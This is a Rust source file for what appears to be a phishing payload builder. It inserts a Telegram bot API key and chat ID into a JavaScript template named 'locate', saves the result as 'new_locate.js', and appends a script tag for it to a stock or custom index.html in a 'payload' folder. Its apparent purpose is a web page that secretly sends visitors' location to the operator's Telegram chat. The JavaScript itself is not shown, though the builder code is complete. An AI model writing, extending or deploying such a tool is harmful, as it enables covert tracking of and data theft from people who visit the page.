#[warn(unused_imports)]
use std::fs;
use std::fs::OpenOptions;
use std::io::{Result, Write};
use std::fs::File;
use std::io::prelude::*;
use std::path::PathBuf;

// const APPEND :&str = "<script src=\"new_locate.js\"></script>";

#[warn(unused_imports)]
macro_rules! read {
    ($out:ident as $type:ty) => {
        std::io::stdout().flush().unwrap();
        let mut inner = String::new();
        std::io::stdin().read_line(&mut inner).expect("Please Validate the input");
        let $out = inner.trim().parse::<$type>().expect("Parsable");
    };
}

pub fn bind_js_to_file(api_key: &str, chat_id: &str) -> Result<()>{
    let file = fs::read_to_string("files/locate.js.md");
    let content = file?.replace("YOUR_TELEGRAM_BOT_API_KEY", api_key)
        .replace("YOUR_CHAT_ID", chat_id);

    fs::write("payload/new_locate.js", content)?;

    println!("Js Binded with your API Keys!");
    Ok(())
}

pub fn bind_js_to_html(){
    let file_path  = "payload/index.html";
    let append = "<script src=\"new_locate.js\"></script>";

    let mut file = OpenOptions::new()
        .append(true)
        .open(file_path)
        .expect("Failed to open file");
    file.write_all(append.as_bytes()).expect("Failed to write file ");
    println!("Successfully Binded <script> to the index.html file");
}

// Code for 2nd option
pub fn extend_bind(){
    println!("Check if you have saved your custom website in the payload directory");
    println!("Press any key to continue ...");

    std::io::stdin().read_line(&mut String::new()).unwrap();

    let html_path = "payload/index.html";
    
    println!("Checking if file exists !");
    if check_if_file_exists(PathBuf::from(&html_path)).is_ok(){
        println!();
    }
    if check_if_file_exists(PathBuf::from(&html_path)).is_err(){
        println!("[+]Error: File index.html not Found! \nPlease Save your Files at /payload directory and Try again.");
        std::process::exit(1);
    }
    
    let append = "<script src=\"new_locate.js\"></script>";
    let mut file = OpenOptions::new()
        .append(true)
        .open(html_path)
        .expect("Failed to open file");
    file.write_all(append.as_bytes()).expect("Failed to write file");
    println!("Successfully Binded <script> to the custom index.html");
}

// Check keys if present show it . else create an new key
pub fn check_keys(){
    if File::open("key.txt").is_ok(){
        let mut file = File::open("key.txt").unwrap();
        let mut content = String::new();
        file.read_to_string(&mut content).unwrap();

        let keys: Vec<&str> = content.lines().collect();
        println!("Listing Up Keys 🗝");
        println!("API_KEY : {}",&keys[0]);
        println!("CHAT_ID : {}",&keys[1]);
    } else {
        println!("key.txt file does not found !");
        println!("Creating new one !");
        key_store_to_txt_file();
    }
}
pub fn key_store_to_txt_file(){
    print!("Enter Telegram API Key :");
    read!(api_key as String);
    let api_key = api_key.trim_end();
    print!("Enter Chat ID :");
    read!(chat_id as String);
    let chat_id = chat_id.trim_end();

    let keys = vec![api_key,chat_id];
    let mut file = File::create("key.txt").unwrap();
    for key in keys{
        writeln!(file , "{}" , key).unwrap();
    }
    println!("Keys successfully stored in key.txt file");
}


// Program starting check !
pub fn check_keys_default(){
    if let Ok(mut file) = File::open("key.txt"){
        let mut contents = String::new();
        file.read_to_string(&mut contents).unwrap();

        if contents.trim().is_empty(){
            println!("Didnt save keys");
            key_store_to_txt_file();
        } else {
            println!("keys found");
        }
    } else {
        println!("key.txt file does not found !");
        println!("Creating new one !");
        key_store_to_txt_file();
    }
}

pub fn check_if_file_exists(path: PathBuf) -> anyhow::Result<String>{
    let mut string = String::new();
    // let path = "payload/index.html";
    let mut file: File = match File::open(path){
        Ok(handle) => handle,
        Err(error) => return Err(error.into()),
    };

    match file.read_to_string(&mut string){
        Ok(_) => (),
        Err(error) => return Err(error.into()),
    };
    Ok(string)
} 